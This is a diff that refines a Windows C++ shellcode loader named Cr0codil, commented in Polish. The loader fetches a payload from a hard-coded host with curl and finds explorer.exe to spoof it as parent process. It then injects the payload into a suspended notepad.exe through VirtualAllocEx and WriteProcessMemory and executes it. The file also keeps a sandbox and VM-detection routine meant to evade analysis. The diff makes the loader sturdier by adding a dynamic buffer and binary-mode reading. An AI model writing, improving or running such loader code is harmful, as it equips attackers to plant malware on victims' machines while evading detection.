@@ -1,4 +1,4 @@
-﻿// Cr0codil.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
+// Cr0codil.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
 //
 
 #include <iostream>
@@ -9,36 +9,52 @@
 #include <string.h>
 #include <Psapi.h>
 #include <stdio.h>
+#include <vector>        // <-- dodane dla std::vector
+#include <cctype>        // dla isprint (opcjonalnie)
+
 #pragma comment(lib, "Winhttp.lib")
 #pragma comment(lib, "IPHlpApi.lib")
 
-
 bool dynamicAnalysisCheck();
-
-
 
 int main()
 {
     FILE* fpipe;
-    const char* command = "curl http://192.168.0.32:8000/payload.bin"; //set your addres
-    char c = 0;
-    char shellcode[510] = { 0 }; //set real payload size 
-    int counter = 0;
-    if (0 == (fpipe = (FILE*)_popen(command, "r"))) {
+    const char* command = "curl http://192.168.0.32:8000/payload.bin"; // ustaw swój adres
+    std::vector<char> shellcode;   // dynamiczny bufor na payload
+    char buffer[4096];             // tymczasowy bufor do odczytu
+    size_t bytesRead;
+
+    // Otwarcie potoku w trybie binarnym ("rb") – ważne dla danych binarnych
+    if (0 == (fpipe = (FILE*)_popen(command, "rb"))) {
         perror("popen() failed.\n");
         exit(EXIT_FAILURE);
     }
-    while (fread(&c, sizeof c, 1, fpipe)) {
-        if (counter >= sizeof(shellcode)) {
-            printf("Payload is larger than local shellcode buffer.\n");
-            break;
+
+    printf("Downloading payload...\n");
+
+    // Odczytuj dane porcjami i dodawaj do wektora
+    while ((bytesRead = fread(buffer, 1, sizeof(buffer), fpipe)) > 0) {
+        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
+
+        // Opcjonalne wyświetlanie pobranych bajtów (tylko drukowalne znaki)
+        for (size_t i = 0; i < bytesRead; ++i) {
+            if (isprint(static_cast<unsigned char>(buffer[i])))
+                putchar(buffer[i]);
+            else
+                putchar('.');
         }
-        shellcode[counter] = c;
-        printf("%c", c);
-        counter++;
     }
     _pclose(fpipe);
 
+    if (shellcode.empty()) {
+        printf("\nNo payload downloaded or empty file.\n");
+        return 1;
+    }
+
+    printf("\n\nPayload downloaded successfully. Size: %zu bytes\n", shellcode.size());
+
+    // ------------------- Pobieranie listy procesów i znalezienie explorer.exe -------------------
     DWORD runningProcessesIDs[1024];
     DWORD runningProcessesCountBytes;
     DWORD runningProcessesCount;
@@ -59,7 +75,7 @@ int main()
                 CloseHandle(hProcess);
                 continue;
             }
-            processName[size] = '\0'; // Ensure the string is null-terminated
+            processName[size] = '\0'; // Ensure null-termination
             _strlwr_s(processName);
             if (strstr(processName, "explorer.exe") && hProcess) {
                 if (hExplorerexe) {
@@ -73,21 +89,15 @@ int main()
         }
     }
 
-
-    // Disabled anti-debug / anti-VM checks.
+    // ------------------- Opcjonalne sprawdzenia anty-debug / VM (zakomentowane) -------------------
     // bool checkStatus = dynamicAnalysisCheck();
     // if (IsDebuggerPresent() == true && checkStatus == false) {
     //     printf("Dynamic analysis check returned VM or debugger presence. Exiting...\n");
     //     return 0;
     // }
+
+    // ------------------- Tworzenie procesu Notepad.exe z explorer.exe jako rodzicem -------------------
     {
-        if (counter <= 0) {
-            printf("No payload downloaded.\n");
-            return 1;
-        }
-
-        // Create a new process (Notepad.exe) with explorer.exe as its parent process
-
         STARTUPINFOEXA si;
         PROCESS_INFORMATION pi;
         SIZE_T attributeSize;
@@ -105,15 +115,18 @@ int main()
         }
         si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
-        if (!CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &si.StartupInfo, &pi)) {
+        if (!CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE,
+                            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL,
+                            &si.StartupInfo, &pi)) {
             printf("Failed to create process. Error: %d\n", GetLastError());
             goto process_cleanup;
         }
 
         printf("Process created with PID: %d\n", pi.dwProcessId);
 
-        // Inject and execute the shellcode in the new process
-        const SIZE_T payloadSize = (SIZE_T)counter;
+        // ------------------- Wstrzyknięcie i uruchomienie shellcode'u -------------------
+        const SIZE_T payloadSize = shellcode.size();
+
         exec = VirtualAllocEx(pi.hProcess, 0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!exec) {
             printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
@@ -121,7 +134,7 @@ int main()
         }
 
         SIZE_T written;
-        if (!WriteProcessMemory(pi.hProcess, exec, shellcode, payloadSize, &written) || written != payloadSize) {
+        if (!WriteProcessMemory(pi.hProcess, exec, shellcode.data(), payloadSize, &written) || written != payloadSize) {
             printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
             goto process_cleanup;
         }
@@ -170,21 +183,23 @@ int main()
 
     return 0;
 }
+
+// Funkcja sprawdzająca środowisko (VM / debugger) – niezmieniona
 bool dynamicAnalysisCheck() {
-    // check CPU
+    // Sprawdzenie CPU
     SYSTEM_INFO systemInfo;
     GetSystemInfo(&systemInfo);
     DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
     if (numberOfProcessors < 2) return false;
 
-    // check RAM
+    // Sprawdzenie RAM
     MEMORYSTATUSEX memoryStatus;
     memoryStatus.dwLength = sizeof(memoryStatus);
     GlobalMemoryStatusEx(&memoryStatus);
     DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
     if (RAMMB < 2048) return false;
 
-    // check HDD
+    // Sprawdzenie HDD
     HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     DISK_GEOMETRY pDiskGeometry;
     DWORD bytesReturned;
@@ -197,11 +212,12 @@ bool dynamicAnalysisCheck() {
     DWORD diskSizeGB;
     diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
     if (diskSizeGB < 100) return false;
-    // check files
+
+    // Sprawdzenie obecności plików VirtualBox
     WIN32_FIND_DATAW findFileData;
     if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;
 
-    // check internet connection (server response should be 1337 change it if you want)
+    // Sprawdzenie połączenia internetowego (oryginalnie oczekiwał odpowiedzi 1337 – zakomentowane)
     HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return false;
     HINTERNET hConnection = WinHttpConnect(hSession, L"google.com", INTERNET_DEFAULT_HTTP_PORT, 0);
@@ -255,18 +271,7 @@ bool dynamicAnalysisCheck() {
     if (hSession) {
         WinHttpCloseHandle(hSession);
     }
-  //  if (atoi((PSTR)response) != 1337) return false;
+    // if (atoi((PSTR)response) != 1337) return false;
 
     return true;
-
 }
-
-// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania
-// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie
-// Porady dotyczące rozpoczynania pracy:
-//   1. Użyj okna Eksploratora rozwiązań, aby dodać pliki i zarządzać nimi
-//   2. Użyj okna programu Team Explorer, aby nawiązać połączenie z kontrolą źródła
-//   3. Użyj okna Dane wyjściowe, aby sprawdzić dane wyjściowe kompilacji i inne komunikaty
-//   4. Użyj okna Lista błędów, aby zobaczyć błędy
-//   5. Wybierz pozycję Projekt > Dodaj nowy element, aby utworzyć nowe pliki kodu, lub wybierz pozycję Projekt > Dodaj istniejący element, aby dodać istniejące pliku kodu do projektu
-//   6. Aby w przyszłości ponownie otworzyć ten projekt, przejdź do pozycji Plik > Otwórz > Projekt i wybierz plik sln
